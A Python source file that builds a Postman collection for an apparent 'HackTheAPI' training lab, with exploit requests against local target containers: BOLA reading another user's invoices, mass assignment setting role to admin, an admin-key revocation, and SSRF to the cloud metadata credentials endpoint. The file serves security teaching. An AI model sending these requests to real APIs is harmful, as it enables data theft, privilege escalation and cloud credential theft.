class PostmanExporter:
    @staticmethod
    def generate_collection():
        """
        Generates Postman Collection v2.1.0 JSON Specification for OWASP API Top 10 Testing.
        """
        return {
            "info": {
                "name": "HackTheAPI - OWASP API Security Top 10 Collection",
                "_postman_id": "hacktheapi-owasp-top10-v2026",
                "description": "Postman Collection for testing vulnerabilities against isolated target API containers.",
                "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
            },
            "variable": [
                { "key": "base_url", "value": "http://localhost:8000/api/v1/targets" },
                { "key": "auth_token", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.user_1001_token" }
            ],
            "item": [
                {
                    "name": "API1:2023 - BOLA (Broken Object Level Authorization)",
                    "request": {
                        "method": "GET",
                        "header": [
                            { "key": "Authorization", "value": "Bearer {{auth_token}}" }
                        ],
                        "url": {
                            "raw": "{{base_url}}/users/1002/invoices",
                            "host": ["{{base_url}}"],
                            "path": ["users", "1002", "invoices"]
                        },
                        "description": "Exploit BOLA by requesting another user's invoice ID (1002)."
                    }
                },
                {
                    "name": "API2:2023 - Broken Authentication",
                    "request": {
                        "method": "POST",
                        "header": [
                            { "key": "Content-Type", "value": "application/json" }
                        ],
                        "url": {
                            "raw": "{{base_url}}/auth/refresh",
                            "host": ["{{base_url}}"],
                            "path": ["auth", "refresh"]
                        }
                    }
                },
                {
                    "name": "API3:2023 - Mass Assignment / Property Level Authorization",
                    "request": {
                        "method": "PATCH",
                        "header": [
                            { "key": "Authorization", "value": "Bearer {{auth_token}}" },
                            { "key": "Content-Type", "value": "application/json" }
                        ],
                        "body": {
                            "mode": "raw",
                            "raw": "{\n  \"name\": \"Jane Student\",\n  \"role\": \"admin\"\n}"
                        },
                        "url": {
                            "raw": "{{base_url}}/users/me",
                            "host": ["{{base_url}}"],
                            "path": ["users", "me"]
                        }
                    }
                },
                {
                    "name": "API5:2023 - BFLA (Broken Function Level Authorization)",
                    "request": {
                        "method": "POST",
                        "header": [
                            { "key": "Authorization", "value": "Bearer {{auth_token}}" },
                            { "key": "Content-Type", "value": "application/json" }
                        ],
                        "body": {
                            "mode": "raw",
                            "raw": "{\n  \"target_key_id\": \"KEY-SYS-ADMIN-01\"\n}"
                        },
                        "url": {
                            "raw": "{{base_url}}/admin/access-keys/revoke",
                            "host": ["{{base_url}}"],
                            "path": ["admin", "access-keys", "revoke"]
                        }
                    }
                },
                {
                    "name": "API7:2023 - SSRF (Server Side Request Forgery)",
                    "request": {
                        "method": "POST",
                        "header": [
                            { "key": "Content-Type", "value": "application/json" }
                        ],
                        "body": {
                            "mode": "raw",
                            "raw": "{\n  \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n}"
                        },
                        "url": {
                            "raw": "{{base_url}}/fetch-avatar",
                            "host": ["{{base_url}}"],
                            "path": ["fetch-avatar"]
                        }
                    }
                }
            ]
        }
